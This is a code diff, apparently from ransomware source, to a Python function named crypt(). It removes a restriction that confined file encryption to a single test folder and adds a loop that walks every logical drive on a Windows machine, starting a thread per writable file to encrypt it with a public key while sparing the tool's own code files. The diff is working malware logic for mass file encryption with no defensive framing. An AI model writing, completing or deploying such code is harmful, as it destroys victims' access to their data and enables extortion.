@@ -84,8 +84,20 @@ def crypt():
     drives = win32api.GetLogicalDriveStrings()
     drives = drives.split('\000')[:-1]
 
-    # for drive in drives:
-    #     for dirpath, dirnames, filenames in os.walk(drive):
+    for drive in drives:
+        for dirpath, dirnames, filenames in os.walk(drive):
+            for filename in filenames:
+                if protect_Code_Files(filename) == False:
+                    file = os.path.join(dirpath, filename)
+                    if os.access(file, os.W_OK):
+                        Thread(target=encrypt_file, args=(file, pubkey)).start()
+                    else:
+                        print("access denied to this file : ", file)
+                    
+
+    # drive = "C:\\Users\\win10\\Desktop\\Test"
+
+    # for dirpath, dirnames, filenames in os.walk(drive):
     #         for filename in filenames:
     #             if protect_Code_Files(filename) == False:
     #                 file = os.path.join(dirpath, filename)
@@ -95,19 +107,6 @@ def crypt():
     #                     print(file)
     #                 except:
     #                     print("can't encrypt the file : " + str(file))
-
-    drive = "C:\\Users\\win10\\Desktop\\Test"
-
-    for dirpath, dirnames, filenames in os.walk(drive):
-            for filename in filenames:
-                if protect_Code_Files(filename) == False:
-                    file = os.path.join(dirpath, filename)
-                    try:
-                        # ############################ 5- encrypt the files ################################
-                        encrypt_file(file, pubkey)
-                        print(file)
-                    except:
-                        print("can't encrypt the file : " + str(file))
 
     input(">")
 
